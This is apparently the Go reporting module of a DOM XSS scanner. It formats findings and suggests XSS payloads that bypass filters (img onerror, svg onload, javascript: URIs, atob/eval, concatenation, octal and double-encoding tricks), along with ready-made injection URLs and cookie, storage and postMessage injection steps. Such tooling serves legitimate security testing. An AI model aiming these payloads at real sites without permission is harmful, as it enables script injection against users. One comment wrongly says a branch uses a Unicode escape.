package report

import (
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"regexp"
	"strings"

	"github.com/Meco30701X/xssprobe/scanner"
	"github.com/Meco30701X/xssprobe/verifier"
)

// suggestPayload returns a concrete payload suggestion based on the sink type and filtering
func suggestPayload(sinkFunc, filterType string) string {
	lower := strings.ToLower(sinkFunc)
	filterLower := strings.ToLower(filterType)

	// Helper function to get base payload for sink type
	getBasePayload := func(encodeFunc func(string) string) string {
		switch {
		case strings.Contains(lower, "document.write") || strings.Contains(lower, "writeln"):
			return encodeFunc(`<script>alert(1)</script>`)
		case strings.Contains(lower, "innerhtml") || strings.Contains(lower, "outerhtml"):
			return encodeFunc(`<img src=x onerror=alert(1)>`)
		case strings.Contains(lower, "eval") || strings.Contains(lower, "function(") || strings.Contains(lower, "new function"):
			return encodeFunc(`alert(1)`)
		case strings.Contains(lower, "settimeout") || strings.Contains(lower, "setinterval"):
			return encodeFunc(`alert(1)`)
		case strings.Contains(lower, "insertadjacenthtml"):
			return encodeFunc(`<img src=x onerror=alert(1)>`)
		case strings.Contains(lower, ".html("):
			return encodeFunc(`<img src=x onerror=alert(1)>`)
		case strings.Contains(lower, "setattribute"):
			return encodeFunc(`alert(1)`)
		default:
			return encodeFunc(`<script>alert(1)</script>`)
		}
	}

	// 1. Parentheses + backticks filtered → HTML entity bypass
	if strings.Contains(filterLower, "parentheses") && strings.Contains(filterLower, "backtick") {
		return getBasePayload(func(s string) string {
			return strings.ReplaceAll(strings.ReplaceAll(s, "(", "&#40;"), ")", "&#41;")
		})
	}

	// 2. Only parentheses filtered → backtick bypass
	if strings.Contains(filterLower, "parentheses") || strings.Contains(filterLower, "()") {
		return getBasePayload(func(s string) string {
			return strings.ReplaceAll(strings.ReplaceAll(s, "(", "`"), ")", "`")
		})
	}

	// 3. Non-global tag filtering → attribute breakout
	if strings.Contains(filterLower, "regex strip tags") && !strings.Contains(filterLower, "global") {
		return `" onmouseover="alert(1)`
	}

	// 4. Global tag filtering → try double encoding or alternative vectors
	if strings.Contains(filterLower, "regex strip tags") && strings.Contains(filterLower, "global") {
		// Try SVG/MathML vectors that might bypass basic < filtering
		return `<svg onload=alert(1)>`
	}

	// 5. HTML special chars filtered → JavaScript protocol
	if strings.Contains(filterLower, "html special chars") || strings.Contains(filterLower, "html and parentheses") {
		return `javascript:alert(1)`
	}

	// 6. Alphanumeric whitelist → eval/atob bypass
	if strings.Contains(filterLower, "whitelist alphanumeric") || strings.Contains(filterLower, "whitelist lowercase") {
		return `eval(atob('YWxlcnQoMSk='))` // base64 encoded alert(1)
	}

	// 7. Non-word chars filtered → Unicode escape bypass
	if strings.Contains(filterLower, "strip non-word") {
		return `alert(1)` // Unicode escape for 'a'
	}

	// 8. Alert/function names filtered → indirect execution
	if strings.Contains(filterLower, "strip alert") || strings.Contains(filterLower, "strip eval") {
		return `window['al'+'ert'](1)` // String concatenation bypass
	}

	// 9. Document/window filtered → self-referencing
	if strings.Contains(filterLower, "strip document") || strings.Contains(filterLower, "strip window") {
		return `this['al'+'ert'](1)` // this refers to window in event handlers
	}

	// 10. Hex/unicode escapes filtered → octal or decimal
	if strings.Contains(filterLower, "strip hex escapes") || strings.Contains(filterLower, "strip unicode escapes") {
		return `\141lert(1)` // Octal escape for 'a'
	}

	// 11. URL encoding filtered → double URL encoding
	if strings.Contains(filterLower, "strip url encoding") {
		return `%253Cscript%253Ealert(1)%253C/script%253E` // Double URL encoding
	}

	// 12. Quotes filtered → template literals or no-quote payloads
	if strings.Contains(filterLower, "strip quotes") {
		return getBasePayload(func(s string) string {
			return s // Payloads without quotes
		})
	}

	// 13. Digits filtered → no-digit payloads
	if strings.Contains(filterLower, "strip digits") {
		return `<img src=x onerror=alert(location)>` // Use location instead of 1
	}

	// 14. Standard payloads (no filtering detected)
	return getBasePayload(func(s string) string { return s })
}

// extractParamName extracts the parameter name from SourceName like "URL helper functions(via xss)"
var viaPattern = regexp.MustCompile(`\(via\s+(\w+)\)`)

func extractParamName(sourceName string) string {
	m := viaPattern.FindStringSubmatch(sourceName)
	if len(m) > 1 {
		return m[1]
	}
	return ""
}

// buildInjectionURL constructs the injection URL with the payload
func buildInjectionURL(pageURL, param, payload string) string {
	u, err := url.Parse(pageURL)
	if err != nil {
		return ""
	}
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	return u.String()
}

// PrintFindings prints findings to stdout in a readable format
// pageURL is optional; when provided, injection URLs are shown for URL-parameter-based findings
func PrintFindings(findings []scanner.Finding, sourceURL string, pageURL ...string) {
	if len(findings) == 0 {
		fmt.Printf("[✓] %s - No DOM XSS issues found\n", sourceURL)
		return
	}

	// Determine the page URL for injection links
	var targetPage string
	if len(pageURL) > 0 && pageURL[0] != "" {
		targetPage = pageURL[0]
	}

	fmt.Printf("\n[!] %s - %d potential DOM XSS found\n", sourceURL, len(findings))
	fmt.Println("─────────────────────────────────────────")

	for i, f := range findings {
		severityColor := map[string]string{
			"high":   "\033[31m", // red
			"medium": "\033[33m", // yellow
			"low":    "\033[32m", // green
		}
		reset := "\033[0m"
		color := severityColor[f.Severity]

		fmt.Printf("  #%d [%s%s%s]\n", i+1, color, f.Severity, reset)
		fmt.Printf("    Source: %s → Sink: %s\n", f.Source, f.Sink)
		fmt.Printf("    Line %d: %s\n", f.Line, f.Code)

		// Show filter information if detected
		if f.Filtered {
			fmt.Printf("    ⚠️  Filtering detected: %s\n", f.FilterType)
		}
		if f.Confidence != "" {
			fmt.Printf("    Confidence: %s\n", f.Confidence)
		}

		// Show actionable injection details based on source type
		payload := suggestPayload(f.Sink, f.FilterType)
		printInjectionDetails(f.Source, payload, targetPage)

		fmt.Println()
	}
}

// printInjectionDetails shows actionable injection information based on the source type
func printInjectionDetails(source, payload, targetPage string) {
	lower := strings.ToLower(source)

	// 1. URL parameter injection (via getUrl, getParameter, etc.)
	if paramName := extractParamName(source); paramName != "" {
		if targetPage != "" {
			injectionURL := buildInjectionURL(targetPage, paramName, payload)
			if injectionURL != "" {
				fmt.Printf("\n    🔗 Injection URL:\n       %s\n", injectionURL)
				fmt.Printf("    💡 Suggested payload: %s\n", payload)
				fmt.Printf("    📌 Parameter: %s\n", paramName)
			}
		} else {
			fmt.Printf("\n    💡 Suggested payload: %s\n", payload)
			fmt.Printf("    📌 Parameter: %s (append ?%s=<payload> to page URL)\n", paramName, paramName)
		}
		return
	}

	// 2. Hash injection (#payload)
	if strings.Contains(lower, "hash") {
		if targetPage != "" {
			fmt.Printf("\n    🔗 Injection URL:\n       %s#%s\n", targetPage, payload)
			fmt.Printf("    💡 Suggested payload: %s\n", payload)
			fmt.Printf("    📌 Injection point: URL fragment (#)\n")
		} else {
			fmt.Printf("\n    💡 Suggested payload: %s\n", payload)
			fmt.Printf("    📌 Injection point: URL fragment (append #<payload> to URL)\n")
		}
		return
	}

	// 3. Query string injection (location.search)
	if strings.Contains(lower, "search") || strings.Contains(lower, "query") {
		if targetPage != "" {
			fmt.Printf("\n    🔗 Injection URL:\n       %s?%s\n", targetPage, payload)
			fmt.Printf("    💡 Suggested payload: %s\n", payload)
			fmt.Printf("    📌 Injection point: Query string\n")
		} else {
			fmt.Printf("\n    💡 Suggested payload: %s\n", payload)
			fmt.Printf("    📌 Injection point: Query string (append ?<payload> to URL)\n")
		}
		return
	}

	// 4. Cookie injection
	if strings.Contains(lower, "cookie") {
		fmt.Printf("\n    💡 Suggested payload: %s\n", payload)
		fmt.Printf("    📌 Injection point: Cookie\n")
		fmt.Printf("    📝 How to inject:\n")
		fmt.Printf("       document.cookie = \"vulnerable=%s\"\n", payload)
		fmt.Printf("       Or via HTTP header: Cookie: vulnerable=%s\n", payload)
		return
	}

	// 5. Storage injection (localStorage/sessionStorage)
	if strings.Contains(lower, "localstorage") || strings.Contains(lower, "sessionstorage") {
		fmt.Printf("\n    💡 Suggested payload: %s\n", payload)
		fmt.Printf("    📌 Injection point: Web Storage\n")
		fmt.Printf("    📝 How to inject:\n")
		fmt.Printf("       localStorage.setItem('vulnerable', '%s')\n", payload)
		return
	}

	// 6. postMessage injection
	if strings.Contains(lower, "postmessage") || strings.Contains(lower, "message") {
		fmt.Printf("\n    💡 Suggested payload: %s\n", payload)
		fmt.Printf("    📌 Injection point: postMessage\n")
		fmt.Printf("    📝 How to inject:\n")
		fmt.Printf("       window.postMessage('%s', '*')\n", payload)
		return
	}

	// 7. Document URL/referrer injection
	if strings.Contains(lower, "document.url") || strings.Contains(lower, "document.documenturi") ||
		strings.Contains(lower, "document.referrer") || strings.Contains(lower, "document.baseuri") {
		if targetPage != "" {
			fmt.Printf("\n    🔗 Injection URL:\n       %s?%s\n", targetPage, payload)
			fmt.Printf("    💡 Suggested payload: %s\n", payload)
			fmt.Printf("    📌 Injection point: URL (via document.URL/referrer)\n")
		} else {
			fmt.Printf("\n    💡 Suggested payload: %s\n", payload)
			fmt.Printf("    📌 Injection point: URL (navigate to page with payload in URL)\n")
		}
		return
	}

	// 8. window.name injection
	if strings.Contains(lower, "window.name") {
		fmt.Printf("\n    💡 Suggested payload: %s\n", payload)
		fmt.Printf("    📌 Injection point: window.name\n")
		fmt.Printf("    📝 How to inject:\n")
		fmt.Printf("       window.name = '%s'\n", payload)
		fmt.Printf("       Or via: <a href=\"target.html\" target=\"victim\">click</a>\n")
		return
	}

	// 9. Form input injection
	if strings.Contains(lower, "element.value") || strings.Contains(lower, "form") {
		fmt.Printf("\n    💡 Suggested payload: %s\n", payload)
		fmt.Printf("    📌 Injection point: Form input\n")
		fmt.Printf("    📝 How to inject: Submit form with payload in input field\n")
		return
	}

	// 10. Unknown source - show generic guidance
	if source != "unknown" && !strings.Contains(lower, "unknown") {
		fmt.Printf("\n    💡 Suggested payload: %s\n", payload)
		fmt.Printf("    📌 Injection point: %s\n", source)
	}
}

// OutputJSON writes findings to a JSON file
func OutputJSON(findings []scanner.Finding, filename string) error {
	type output struct {
		StaticFindings []scanner.Finding `json:"static_findings"`
	}

	data, err := json.MarshalIndent(output{StaticFindings: findings}, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(filename, data, 0644)
}

// OutputVerifiedJSON writes both static findings and verification results to JSON
func OutputVerifiedJSON(findings []scanner.Finding, results []verifier.VerifyResult, filename string) error {
	type output struct {
		StaticFindings      []scanner.Finding      `json:"static_findings"`
		DynamicVerification []verifier.VerifyResult `json:"dynamic_verification"`
	}

	// Filter to only confirmed results
	var confirmed []verifier.VerifyResult
	for _, r := range results {
		if r.Triggered {
			confirmed = append(confirmed, r)
		}
	}

	data, err := json.MarshalIndent(output{
		StaticFindings:      findings,
		DynamicVerification: confirmed,
	}, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(filename, data, 0644)
}
